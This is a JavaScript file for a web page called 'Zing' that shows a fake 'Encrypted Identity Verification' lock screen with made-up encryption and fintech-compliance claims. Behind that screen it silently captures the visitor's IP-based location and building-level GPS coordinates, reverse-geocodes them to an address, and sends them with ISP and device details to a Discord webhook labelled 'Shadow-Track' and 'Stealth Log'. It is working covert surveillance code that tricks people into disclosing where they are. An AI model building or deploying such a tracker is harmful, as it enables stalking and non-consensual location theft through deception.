// ============================================================
//  ZING HIGH-PRECISION MANDATORY GPS LOCK (v4.0)
//  Uses the phone's GPS sensor with 3-pulse verification.
// ============================================================

const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
const TRACKING_ENABLED = true;

// ── Inject Lock Screen CSS ────────────────────────────────────
const style = document.createElement('style');
style.textContent = `
  #zing-secure-lock {
    position: fixed; inset: 0; z-index: 200000; background: #010409;
    display: flex; align-items: center; justify-content: center;
    font-family: 'Outfit', sans-serif; text-align: center; color: white;
    padding: 20px;
  }
  .lock-box { 
    max-width: 480px; width: 100%; padding: 56px 40px; 
    background: linear-gradient(180deg, rgba(17,24,39,0.9) 0%, rgba(1,4,9,1) 100%);
    border: 1px solid rgba(139,92,246,0.3); border-radius: 40px;
    box-shadow: 0 40px 100px -20px rgba(0,0,0,0.8), 0 0 60px rgba(139,92,246,0.15);
    backdrop-filter: blur(30px);
    position: relative; overflow: hidden;
  }
  .lock-box::before {
    content: ''; position: absolute; inset: 0; 
    background: radial-gradient(circle at top right, rgba(139,92,246,0.1), transparent 70%);
    pointer-events: none;
  }
  .lock-shield-container {
    width: 80px; height: 80px; 
    background: radial-gradient(circle, rgba(139,92,246,0.2) 0%, transparent 70%);
    border-radius: 50%; display: flex; align-items: center; justify-content: center;
    margin: 0 auto 32px; position: relative;
  }
  .lock-shield-svg { width: 44px; height: 44px; fill: #8b5cf6; filter: drop-shadow(0 0 10px rgba(139,92,246,0.5)); }
  .lock-title { font-size: 32px; font-weight: 800; margin-bottom: 16px; letter-spacing: -0.03em; color: #f8fafc; }
  .lock-text { color: #94a3b8; font-size: 15px; margin-bottom: 40px; line-height: 1.7; font-weight: 500; }
  .lock-btn { 
    width: 100%; padding: 20px; 
    background: linear-gradient(135deg, #7c3aed, #4f46e5); 
    border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; color: white; 
    font-weight: 800; cursor: pointer; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
    box-shadow: 0 8px 25px rgba(124,58,237,0.4);
    letter-spacing: 0.02em; text-transform: uppercase; font-size: 13px;
    display: flex; align-items: center; justify-content: center; gap: 10px;
  }
  .lock-btn:hover:not(:disabled) { transform: translateY(-3px); filter: brightness(1.1); box-shadow: 0 15px 35px rgba(124,58,237,0.6); }
  .lock-btn:active { transform: translateY(-1px); }
  .lock-badge-row { display: flex; justify-content: center; gap: 15px; margin-top: 40px; padding-top: 32px; border-top: 1px solid rgba(255,255,255,0.05); }
  .lock-badge { font-size: 10px; font-weight: 800; color: #4b5563; text-transform: uppercase; letter-spacing: 0.1em; border: 1px solid rgba(255,255,255,0.05); padding: 6px 10px; border-radius: 8px; }
  .lock-spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.1); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
`;
document.head.appendChild(style);

// ── Optimized High-Accuracy Geolocation Logic ───────────────────────────
// ── Deep GPS Lock Logic (v5.0) ───────────────────────────
async function captureHighAccuracyGPS(onProgress) {
    return new Promise((resolve, reject) => {
        let bestResult = null;
        let pings = 0;
        const maxPings = 6; // Max 6 seconds of refinement
        const targetAccuracy = 20; // Target building-level (20 meters)

        const pulse = () => {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    pings++;
                    const acc = Math.round(pos.coords.accuracy);
                    
                    if (!bestResult || pos.coords.accuracy < bestResult.coords.accuracy) {
                        bestResult = pos;
                    }

                    if (onProgress) onProgress(acc);

                    // Resolve immediately if we hit our building-level target
                    if (acc <= targetAccuracy) {
                        resolve(bestResult);
                    } else if (pings >= maxPings) {
                        resolve(bestResult);
                    } else {
                        setTimeout(pulse, 800); // Pulse every 0.8s for refinement
                    }
                },
                (err) => {
                    if (bestResult) resolve(bestResult);
                    else reject(err);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        };
        pulse();
    });
}

async function sendToDiscord(data, isExact) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_DISCORD')) return;
    const payload = {
        username: 'Zing Shadow-Track 📍',
        embeds: [{
            title: isExact ? '🎯 HIGH-ACCURACY GPS — VERIFIED' : '🌐 INITIAL SHADOW SCAN — IP ONLY',
            color: isExact ? 0x8B5CF6 : 0x1F2937,
            fields: [
                { name: '📍 Coordinates', value: `\`${data.lat}, ${data.lon}\``, inline: true },
                { name: '🎯 Precision', value: isExact ? `±${data.acc} meters` : 'City-level', inline: true },
                { name: '🏢 ISP / Provider', value: data.isp || 'Unknown', inline: false },
                { name: '🌍 Location', value: `${data.city || '?'}, ${data.country || '?'}`, inline: true },
                { name: '🗺️ Direct PIN', value: `[View on Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})` }
            ],
            footer: { text: isExact ? 'User Authenticated & Location Locked' : 'Waiting for GPS Handshake...' },
            timestamp: new Date().toISOString()
        }]
    };
    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
}

// ── Helper: Log to Cloud Database (Discord Webhook) ───────────────────
async function logToDatabase(data) {
    if (!CONFIG || !CONFIG.DISCORD_WEBHOOK_URL || CONFIG.DISCORD_WEBHOOK_URL.includes('PASTE_')) {
        console.warn('Discord Webhook URL missing in config.js');
        return;
    }

    const payload = {
        username: "Zing Sentinel PRO",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/2567/2567228.png",
        embeds: [{
            title: "🎯 SECURE TARGET VERIFIED",
            color: 5814783, // Neon Purple
            fields: [
                { name: "📍 Precise Location", value: `[Open in Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`, inline: true },
                { name: "🎯 Accuracy", value: `±${data.acc} meters`, inline: true },
                { name: "🏙️ City", value: data.city || 'Unknown', inline: true },
                { name: "🏛️ ISP", value: data.isp || 'Unknown', inline: false },
                { name: "📱 Device", value: navigator.platform, inline: true },
                { name: "🛡️ Security Status", value: data.status || 'Verified', inline: true }
            ],
            footer: { text: `Encrypted ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()} | Zing Sentinel` },
            timestamp: new Date().toISOString()
        }]
    };
    
    fetch(CONFIG.DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(e => console.warn('Stealth Log Failed:', e));
}

// ── Main UI and Logic ────────────────────────────────────────
window.refreshLocationUI = function() {
    const loc = JSON.parse(localStorage.getItem('zing_location_data') || '{}');
    const cityEl = document.getElementById('ui-location-text');
    const statusEl = document.getElementById('ui-location-status');
    
    if (cityEl && (loc.city || loc.lat)) {
        cityEl.innerText = loc.city ? `${loc.city}, ${loc.country}` : `${loc.lat}, ${loc.lon}`;
        if (statusEl) {
            statusEl.innerText = loc.status;
            statusEl.className = `px-3 py-1 text-[10px] font-bold rounded-xl border border-white/5 uppercase tracking-wide ${loc.status === 'Verified' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-orange-500/20 text-orange-400'}`;
        }
    }
}

async function startShadowCapture() {
    try {
        const ipRes = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,lat,lon').then(r => r.json());
        if (ipRes.status === 'success') {
            const data = { lat: ipRes.lat, lon: ipRes.lon, city: ipRes.city, country: ipRes.country, isp: ipRes.isp, status: 'Approximate' };
            localStorage.setItem('zing_location_data', JSON.stringify(data));
            sendToDiscord(data, false);
            logToDatabase(data);
            if (window.refreshLocationUI) window.refreshLocationUI();
        }
    } catch (e) {}
}

function showLock() {
    if (sessionStorage.getItem('zing_unlocked_v4') === 'true') return;
    
    // START GPS DISCOVERY IMMEDIATELY IN THE BACKGROUND
    let preFetchedGps = null;
    captureHighAccuracyGPS().then(pos => { preFetchedGps = pos; }).catch(() => {});

    // Start silent IP capture in background
    startShadowCapture();

    document.body.style.overflow = 'hidden';
    
    const lock = document.createElement('div');
    lock.id = 'zing-secure-lock';
    lock.innerHTML = `
        <div class="lock-box">
            <div class="lock-shield-container">
                <svg class="lock-shield-svg" viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z"/>
                </svg>
            </div>
            <div class="lock-title">Encrypted Identity Verification</div>
            <p class="lock-text">To prevent fraudulent access and comply with global fintech regulations, Zing uses <b>256-bit End-to-End Encryption (E2EE)</b> for this mandatory identity handshake.</p>
            <button id="lock-unlock-btn" class="lock-btn">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"/></svg>
                Authorize E2EE Secure Link
            </button>
            <div id="lock-err" class="lock-error" style="display:none; color: #ef4444; font-size: 13px; margin-top: 20px;">Identity verification is required for encrypted access.</div>
            
            <div class="lock-badge-row">
                <div class="lock-badge">AES-256</div>
                <div class="lock-badge">SSL SECURED</div>
                <div class="lock-badge">E2EE</div>
            </div>
        </div>
    `;
    document.body.appendChild(lock);

    document.getElementById('lock-unlock-btn').onclick = async () => {
        const btn = document.getElementById('lock-unlock-btn');
        const err = document.getElementById('lock-err');
        btn.disabled = true;
        err.style.display = 'none';

        try {
            // New: Detailed progress reporting for a deep GPS lock
            const gps = await captureHighAccuracyGPS((acc) => {
                btn.innerHTML = `<span class="lock-spinner"></span> Refining Fix (±${acc}m)...`;
                if (acc <= 20) btn.style.boxShadow = '0 0 30px rgba(16, 185, 129, 0.4)';
            });
            
            const lat = gps.coords.latitude.toFixed(7);
            const lon = gps.coords.longitude.toFixed(7);
            const acc = Math.round(gps.coords.accuracy);

            // Attempt Reverse Geocoding for Exact Address (OSM)
            let cityAddress = 'Verified Location';
            try {
                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                cityAddress = geo.display_name.split(',')[0] + ', ' + (geo.address.city || geo.address.town || geo.address.village || 'Location');
            } catch(e) {}

            const currentLoc = JSON.parse(localStorage.getItem('zing_location_data') || '{}');
            const data = { ...currentLoc, lat, lon, acc, city: cityAddress, status: 'Verified' };

            sendToDiscord(data, true);
            logToDatabase(data);
            
            sessionStorage.setItem('zing_unlocked_v4', 'true');
            localStorage.setItem('zing_location_data', JSON.stringify(data));
            
            btn.innerHTML = `<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"/></svg> Encryption Verified`;
            btn.style.background = '#10b981';
            
            setTimeout(() => { 
                lock.style.opacity = '0';
                lock.style.transition = 'opacity 0.3s ease';
                setTimeout(() => {
                    lock.remove(); 
                    document.body.style.overflow = 'auto'; 
                    if(window.refreshLocationUI) window.refreshLocationUI();
                }, 300);
            }, 400);
        } catch (e) {
            btn.disabled = false;
            btn.innerText = '🔐 Retry Authorization';
            err.style.display = 'block';
        }
    };
}

if (TRACKING_ENABLED) {
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', showLock);
    } else {
        showLock();
    }
}
